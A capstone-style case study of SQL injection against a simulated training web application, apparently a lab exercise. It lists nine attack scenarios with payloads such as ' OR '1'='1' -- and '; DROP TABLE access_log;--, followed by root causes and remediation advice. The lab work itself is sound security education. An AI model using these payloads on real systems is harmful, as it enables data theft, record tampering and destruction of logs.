# 🛡️ Case Study: Web Application Security Capstone Project (SQL Injection)

This case study analyzes multiple SQL injection vulnerabilities across a simulated web application by performing real attack scenarios, tampering with data, modifying schemas, and exploiting authentication bypasses.

All findings, steps, and crafted queries are sourced from the attached project report.

# 📘 1. Project Overview

The goal of this Web Application Security Capstone Project was to:

- Demonstrate exploitation of SQL Injection vulnerabilities  
- Retrieve unauthorized data  
- Manipulate records inside the database  
- Modify database schema  
- Escalate privileges  
- Compromise availability  

This project simulates real-world weaknesses found in poorly secured applications.

---

# 🎯 2. Problem Statement

The target web application suffers from:

- Direct string concatenation in SQL queries  
- No input validation  
- No parameterized queries  
- No access control  
- Weak database privilege configurations  

As part of the assignment, full administrator privileges were granted to test SQL injection scenarios safely.

# 🧩 3. Scope of Testing

### ✔ In Scope
- DDL, DML, DCL injection  
- String & numeric SQL injection  
- Authentication bypass  
- Data extraction  
- Schema modification  
- Data tampering  
- Table deletion (DoS/availability impact)

### ✖ Out of Scope
- Application exploitation beyond SQL injection  
- Network-level exploitation  
- OS and privilege escalation

# 🔍 4. Methodology

1. Identified input fields vulnerable to SQL Injection  
2. Reviewed backend SQL queries  
3. Crafted malicious payloads  
4. Executed injection attacks (String, Numeric, DML, DDL, DCL)  
5. Validated results using application responses  
6. Documented outputs & evidence

# 🚨 5. Vulnerability Scenarios & Findings

Below are the 9 SQL Injection scenarios tested.

---

## **1. Unauthorized Data Retrieval (Employee Department)**
**Query Used:**  
```sql
SELECT department FROM Employees 
WHERE first_name = 'Bob' AND last_name = 'Franco';
Result: Successfully retrieved Bob Franco’s department (Marketing).
Impact: Sensitive internal data exposure.
2. DML Injection – Modifying Employee Data

Query Used:
UPDATE Employees 
SET department = 'Sales' 
WHERE first_name = 'Tobi' AND last_name = 'Barnett';
Result: Department was modified to Sales.
Impact: Unauthorized data tampering.
3. DDL Injection – Schema Manipulation

Query Used:
ALTER TABLE Employees ADD phone VARCHAR(20);
Result: Successfully added a new column to the table.
Impact: Complete loss of schema integrity.
4. DCL Injection – Granting Unauthorized Rights

Query Used:
GRANT SELECT ON grant_rights TO unauthorized_user;
Result: Unauthorized user received access rights.
Impact: Privilege escalation & access control failure.
5. String-Based SQL Injection – Full Table Dump

Backend Query:
SELECT * FROM user_data 
WHERE first_name = 'John' 
AND last_name = '" + lastName + "'";
Payload Used:

Tab 1: Smith'

Tab 2: '1'='1

Result: Retrieved all users from the table.
Impact: Complete data exposure.
6. Numeric SQL Injection – Authentication Bypass

Backend Query:
SELECT * FROM user_data 
WHERE login_count = " + Login_Count + " 
AND userid = " + User_ID;
Payload Used:

Login Count: 1

User ID: 0 OR 1=1

Result: Retrieved all users from the database.
Impact: Authentication bypass & data leakage.

7. String Input Injection – Employee Table Dump

Backend Query:
SELECT * FROM employees 
WHERE last_name = '" + name + "' 
AND auth_tan = '" + auth_tan + "'";
Payload Used:

Last Name: ' OR '1'='1' --

TAN: (empty)

Result: Dumped all employee records.
Impact: Full disclosure of sensitive HR data.

8. SQL Query Chaining – Unauthorized Salary Manipulation

Query Used:
UPDATE employees 
SET salary = '90000' 
WHERE last_name = 'Smith';
Result: Salary updated successfully; user now earns the highest salary.
Impact: Financial manipulation & privilege abuse.

9. Denial of Service – Deleting Logs (Availability Attack)

Payload Used:
'; DROP TABLE access_log;--
Result: Access log table deleted.
Impact: Loss of forensic data & accountability.
📉 6. Risk Impact Summary
Category	Impact
Confidentiality	🔴 High – Full data disclosure
Integrity	🔴 High – Records and salary manipulated
Availability	🟠 Medium – Logging data destroyed
Authentication	🔴 High – Full bypass via injection

This demonstrates a complete breakdown of CIA triad controls.

🛠️ 7. Root Cause Analysis
Primary Causes

String concatenation in SQL statements

Unvalidated user inputs

Lack of server-side filtering

Over-permissive database privileges

No use of parameterized queries (Prepared statements)

Secondary Causes

Missing input sanitization

Weak access controls

No logging protection

🧭 8. Remediation Recommendations
✔ Immediate Fixes

Implement Prepared Statements

Use Stored Procedures for sensitive operations

Enforce strict least privilege on database accounts

Apply server-side input validation

Escape dangerous characters

✔ Security Hardening

Enable Web Application Firewall (WAF) rules

Enable logging integrity controls

Restrict DDL and DCL rights to DB admins only

✔ Long-Term Strategies

Conduct regular code reviews

Integrate SAST/DAST tools

Perform annual penetration testing

🧾 10. Conclusion

The web application demonstrates severe SQL Injection vulnerabilities allowing:

Full data extraction

Unauthorized data manipulation

Schema modification

Privilege escalation

Log deletion (availability compromise)

Without remediation, these vulnerabilities put the system at critical risk.

Securing the application requires immediate implementation of safe coding practices and database hardening.
